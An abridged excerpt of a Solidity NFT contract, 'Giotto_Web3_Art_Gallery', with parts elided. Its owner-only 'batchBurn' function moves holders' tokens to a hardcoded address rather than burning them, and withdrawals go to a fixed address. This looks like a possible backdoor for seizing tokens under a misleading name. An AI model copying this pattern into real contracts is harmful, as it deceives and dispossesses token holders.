...
contract Giotto_Web3_Art_Gallery is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 45;
  ...
  ) ERC721A("Giotto_Web3_Art_Gallery", "GWAG", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xc79Ff7599feAD47247A110A0CbDBB446B2D66994, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x0104aaEdc0b734CC215ef4ad2fA0bf97AEF5dF8b);
